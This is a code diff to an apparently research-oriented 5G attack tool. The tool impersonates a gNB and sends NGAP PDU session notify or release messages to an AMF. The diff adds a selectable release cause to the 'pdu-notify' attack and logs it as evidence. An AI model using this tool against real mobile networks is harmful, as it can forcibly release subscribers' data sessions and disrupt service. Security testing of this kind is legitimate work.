@@ -72,6 +72,15 @@ def parse_sessions(spec) -> list[int]:
     return [int(x) for x in str(spec).split(",")]
 
 
+def parse_cause(spec: str):
+    """'radioNetwork:release-due-to-ngran-generated-reason' -> (group, name)."""
+    group, sep, name = spec.partition(":")
+    if not sep or not group or not name:
+        raise argparse.ArgumentTypeError(
+            "use group:name, e.g. radioNetwork:release-due-to-ngran-generated-reason")
+    return (group, name)
+
+
 def parse_seccap(spec):
     """--seccap 'nea,nia' as 16-bit hex bitmaps (MSB=algo0). Default None => the
     builder's NEA0/NIA0-only (0x8000), which every AMF accepts (mismatch is a
@@ -368,18 +377,19 @@ def cmd_ho_window_inject(gnb, a):
 
 def cmd_pdu_notify(gnb, a):
     sessions = parse_sessions(a.pdu_sessions)
+    cause = a.cause or ("radioNetwork", "radio-connection-with-ue-lost")
     gnb.send(B.pdu_session_resource_notify(
-        a.amf_ue_id, a.ran_ue_id, pdu_sessions=sessions, released=a.release),
-        wait=False)
+        a.amf_ue_id, a.ran_ue_id, pdu_sessions=sessions, released=a.release,
+        cause=cause), wait=False)
     kind = "released-list" if a.release else "notify-list"
     print(f"[pdu-notify] amf={a.amf_ue_id} ran={a.ran_ue_id} "
           f"pdu={sessions} {kind} sent proc=30 (Class-2)")
     if a.release:
-        print("[pdu-notify] a session release shows up as "
-              "PDUSessionResourceReleaseCommand on the legitimate gNB")
+        print(f"[pdu-notify] cause={cause[0]}:{cause[1]}")
     _save(a.evidence, {"attack": "pdu-notify", "amf_ue_id": a.amf_ue_id,
                        "ran_ue_id": a.ran_ue_id, "pdu_sessions": sessions,
-                       "released": bool(a.release)})
+                       "released": bool(a.release),
+                       "cause": f"{cause[0]}:{cause[1]}" if a.release else None})
     _listen_after(gnb, a, "pdu-notify")
 
 
@@ -1015,6 +1025,9 @@ def main():
     s.add_argument("--release", action="store_true",
                    help="send PDUSessionResourceReleasedListNot (session release) "
                         "instead of the placeholder notify list")
+    s.add_argument("--cause", type=parse_cause, default=None,
+                   help="with --release: group:name "
+                        "(default radioNetwork:radio-connection-with-ue-lost)")
 
     s = sub.add_parser("pdu-modify-ind")
     s.add_argument("--amf-ue-id", type=int, required=True)
